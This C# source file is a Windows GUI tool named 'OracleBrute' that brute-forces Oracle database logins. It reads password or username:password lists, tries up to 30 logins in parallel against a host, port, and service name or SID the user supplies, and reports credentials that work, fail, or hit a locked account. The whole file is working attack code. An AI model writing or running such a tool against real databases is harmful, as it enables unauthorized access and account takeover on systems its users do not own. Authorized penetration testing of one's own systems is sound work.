using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using Microsoft.Win32;
using Oracle.ManagedDataAccess.Client;

namespace OracleBrute
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void button_Click(object sender, RoutedEventArgs e)
        {

            var bag = new ConcurrentBag<string>();
            var useUsernamePasswordList = tbUsername.Text == "";
            var cts = new CancellationTokenSource();
            int iPort;

            if (!int.TryParse(tbPort.Text, out iPort))
            {
                MessageBox.Show("Enter a proper port");
                return;
            }



          
            var ofd = new OpenFileDialog();

            ofd.Multiselect = false;
            if (useUsernamePasswordList)
            {
                MessageBox.Show("Select a username and password list in the form of username:password. One per line");
                ofd.Title = "Username:Password List";
            }
            else
            {
                MessageBox.Show("Select a Password list. One per line");
                ofd.Title = "Password list";
            }

            ofd.ShowDialog();

            if (ofd.FileName == "")
            {
                return;
            }

            this.button.IsEnabled = false;

            bag = new ConcurrentBag<string>(File.ReadAllLines(ofd.FileName));

            string mUsername = tbUsername.Text;
            string IPDNS = tbIPDNS.Text;
            string Service = tbService.Text;
            bool isService = comboBox.Text != "SID";

            Task.Factory.StartNew(() =>
            {

                Parallel.ForEach(bag, new ParallelOptions { MaxDegreeOfParallelism=30, CancellationToken = cts.Token },
                    async item =>
                    {
                        string username = useUsernamePasswordList ? item.Split(':')[0] : mUsername;

                        string password = useUsernamePasswordList ? item.Split(':')[1] : item;

                        try
                        {
            

                            var success = await tryConnect
                                (username,
                                password,
                                IPDNS,
                                 iPort,
                                 Service,
                                 true);

                            Dispatcher.Invoke((Action)delegate
                                {
                                    if (success)
                                    {
                                        lbResults.Items.Add("SUCCESS: " + username + ":" + password);
                                        Dispatcher.Invoke((Action)delegate
                                        {
                                            MessageBox.Show("Found user " + username + ":" + password);
                                        });
                                    }
                                    else
                                    {
                                        lbResults.Items.Add("failed: " + username + ":" + password);
                                    }
                                });
                        }

                        catch (Exception ex)
                        {
                            Dispatcher.Invoke((Action)delegate
                            {
                                if (ex.Message.ToLower().Contains("locked"))
                                {
                                    lbResults.Items.Add("locked: " + username + ":" + password);
                                    return;
                                }
                                else if (ex.Message.ToLower().Contains("well-formed"))
                                {
                                    return;
                                }
                                MessageBox.Show("Error, " + ex.Message);
                                this.button.IsEnabled = true;
                                cts.Cancel();
                                MessageBox.Show("Cancelled");
                            });
                        }
                    });

                Dispatcher.Invoke((Action)delegate
                {
                    MessageBox.Show("Done");
                    this.button.IsEnabled = true;
                });
            });
        }

        private static async Task<bool> tryConnect(string username, string password, string IPDNS, int port, string serviceorSID, bool isService)
        {
            var con = new OracleConnection();
            var sb = new StringBuilder();

            if (isService)
            {
                sb.Append("Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST=").Append(IPDNS).Append(")(PORT=").Append(port.ToString()).Append(")))(CONNECT_DATA=(SERVICE_NAME=").Append(serviceorSID).Append("))));User Id=").Append(username).Append(";Password=").Append(password).Append(";");
            }
            else
            {
                sb.Append("Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST=").Append(IPDNS).Append(")(PORT=").Append(port.ToString()).Append(")))(CONNECT_DATA=(SID=").Append(serviceorSID).Append("))));User Id=").Append(username).Append(";Password=").Append(password).Append(";");
            }

            try
            {
                con.ConnectionString = sb.ToString();
                await con.OpenAsync();
            }
            catch (Exception ex)
            {
                con.Close();
                con.Dispose();

                if (ex.Message == "ORA-01017: invalid username/password; logon denied")
                {
                    return false;
                }

                throw;
            }

            
            con.Close();
            con.Dispose();

            return true;
        }
    }
}
